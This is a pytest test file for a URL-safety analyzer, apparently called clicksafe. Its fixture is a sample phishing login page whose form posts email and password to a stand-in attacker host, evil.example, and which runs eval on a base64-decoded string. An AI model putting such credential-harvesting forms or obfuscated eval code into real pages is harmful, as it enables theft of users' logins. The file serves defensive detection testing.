import pytest

from clicksafe.analyzers.forms import FormsAnalyzer
from clicksafe.analyzers.html import HtmlAnalyzer
from clicksafe.analyzers.javascript import JavaScriptAnalyzer
from clicksafe.analyzers.metadata import MetadataAnalyzer
from clicksafe.analyzers.redirects import RedirectAnalyzer
from clicksafe.domain.analysis import UrlAnalysisContext
from clicksafe.domain.enums import EvidenceSeverity
from clicksafe.infrastructure.browser.playwright_client import BrowserRedirect


@pytest.fixture
def context() -> UrlAnalysisContext:
    html = """
    <html>
      <head>
        <title>Secure Login</title>
        <meta name="description" content="Account portal">
        <link rel="canonical" href="https://example.com/login">
      </head>
      <body>
        <form action="http://evil.example/collect" method="post">
          <input type="email" name="email">
          <input type="password" name="password">
        </form>
        <iframe src="https://third-party.example/frame"></iframe>
        <script>const token = atob("abc"); eval(token);</script>
      </body>
    </html>
    """
    return UrlAnalysisContext(
        submitted_url="https://example.com/login",
        normalized_url="https://example.com/login",
        final_url="https://example.com/login",
        html=html,
        metadata={
            "browser_redirects": [
                BrowserRedirect(
                    url="http://example.com/login",
                    status_code=301,
                    location="https://example.com/login",
                )
            ]
        },
    )


async def test_forms_analyzer_flags_password_and_insecure_action(
    context: UrlAnalysisContext,
) -> None:
    evidence = await FormsAnalyzer().analyze(context)

    assert evidence[0].severity == EvidenceSeverity.HIGH
    assert evidence[0].data["suspicious_form_count"] == 1
    assert evidence[0].data["forms"][0]["has_password"] is True
    assert evidence[0].data["forms"][0]["is_insecure_action"] is True


async def test_javascript_analyzer_flags_eval_and_atob(context: UrlAnalysisContext) -> None:
    evidence = await JavaScriptAnalyzer().analyze(context)

    assert evidence[0].severity == EvidenceSeverity.HIGH
    assert set(evidence[0].data["matched_patterns"]) >= {"eval", "base64_decode"}


async def test_metadata_analyzer_extracts_title_and_description(
    context: UrlAnalysisContext,
) -> None:
    evidence = await MetadataAnalyzer().analyze(context)

    assert evidence[0].data["title"] == "Secure Login"
    assert evidence[0].data["description"] == "Account portal"
    assert evidence[0].data["canonical"] == "https://example.com/login"


async def test_html_analyzer_summarizes_structure(context: UrlAnalysisContext) -> None:
    evidence = await HtmlAnalyzer().analyze(context)

    assert evidence[0].data["iframe_count"] == 1
    assert "iframes_present" in evidence[0].data["suspicious_markers"]


async def test_redirect_analyzer_summarizes_redirects(context: UrlAnalysisContext) -> None:
    evidence = await RedirectAnalyzer().analyze(context)

    assert evidence[0].data["redirect_count"] == 1
    assert evidence[0].data["redirects"][0]["status_code"] == 301
